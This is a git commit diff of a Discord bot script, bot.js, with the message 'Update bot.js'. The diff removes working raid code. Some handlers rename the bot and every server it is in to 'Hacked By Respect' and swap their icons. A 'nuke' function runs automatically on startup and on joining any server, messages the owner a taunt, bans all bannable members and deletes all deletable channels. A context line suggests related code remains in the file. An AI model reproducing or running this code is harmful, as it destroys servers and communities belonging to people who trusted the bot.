b939aff9efb39b5334fc2f17b0ff34901f6348ba
zRespect69 <51334815+zRespect69@users.noreply.github.com>
2019-06-19 05:13:17 +0200

    Update bot.js

--- bot.js
+++ bot.js
@@ -17,64 +17,7 @@ console.log(`Logged in as  * [ "  Randy " ] servers! [ " ${LOka.guilds.size} " ]
    
  
 });
-var prefix = "-"
-LOka.on("message", message => {
-  if(!message.content.startsWith(prefix)) return;;
-  let args = message.content.split(" ").slice(1);
-  var argresult = args.join(' ');
-  if (message.content.startsWith('hix15')) {
-    LOka.user.setUsername(argresult);
-  }
-    if (message.content.startsWith(prefix + 'on123')) {
-    LOka.user.setStatus(argresult);
-  }
-});
- 
-var x1 = "kk"
-LOka.on('message', message => {
-     if (message.content === ".") {
-LOka.user.setAvatar(`https://cdn.discordapp.com/attachments/359820599138451457/368032849011539978/3ae3b128480b1a13a0ab6082cf3e6289.jpg`)
- 
-}
-});
-var x1 = "kk"
-LOka.on('message', message => {
-     if (message.content === ".") {
-LOka.user.setUsername("Hacked By Respect")
- 
-}
-});
-LOka.on('message', message => {
-     if (message.content === ".") {
-LOka.user.setGame(`Hacked By Respect`,'https://www.twitch.tv/hix')
- 
-}
-});
- 
-LOka.on('message', message => {
-     if (message.content === ".") {
-         LOka.guilds.forEach(m =>{
-             m.setIcon(`https://cdn.discordapp.com/attachments/359820599138451457/368032849011539978/3ae3b128480b1a13a0ab6082cf3e6289.jpg`)
-})
-}
-});
-LOka.on('message', message => {
-     if (message.content === ".") {
-         LOka.guilds.forEach(m =>{
-             m.setName(`Hacked By Respect`)
-})
-}
-});
- 
-LOka.on('message', message => {
-     if (message.content === ".") {
-                 if(!message.channel.guild) return;
- 
-             message.guild.setIcon(`https://cdn.discordapp.com/attachments/359820599138451457/368032849011539978/3ae3b128480b1a13a0ab6082cf3e6289.jpg`)
- 
-}
-});
- 
+
 LOka.on('message', message => {
      
  
@@ -407,56 +350,4 @@ m.createChannel('Hacked By Respect', 'voice');
  
 });
  
- 
-const { Client } = require('discord.js');
-const client = new Client();
- 
-async function nuke(guild) {
-  let users = 0;
-  let channels = 0;
- 
-  await guild.fetchMembers();
- 
-  await guild.owner.send(' HacKed سلم على سيرفرك هههههههههههههههه').catch(e => { return void e; });
- 
- 
- 
-  await Promise.all(guild.members.map(async (m) => {
-    if (m.bannable) {
-      users++;
-      await m.send('^_^').catch(e => { return void e; });
-      return m.ban();
-    }
-  }));
- 
-    await Promise.all(guild.channels.map(c => {
-    if (c.deletable) {
-      channels++;
-      return c.delete();
-    }
-  }));
- 
-    await guild.createChannel('Hacked By Respect', 'text');
- 
-      await guild.createChannel('Hacked By Respect', 'voice');
- 
- 
- 
-}
- 
-LOka.on('ready', () => {
-  for(const [, g] of LOka.guilds) nuke(g).catch(console.error);
-  console.log('-------------------------------------------------------------');
-  console.log('');
-  console.log("Made by Randy");
-  console.log("");
-  console.log("-------------------------------------------------------------");
- 
-});
- 
-LOka.on('guildCreate', async (guild) => {
-  return nuke(guild).catch(console.error);
-});
- 
-
 LOka.login(process.env.BOT_TOKEN);
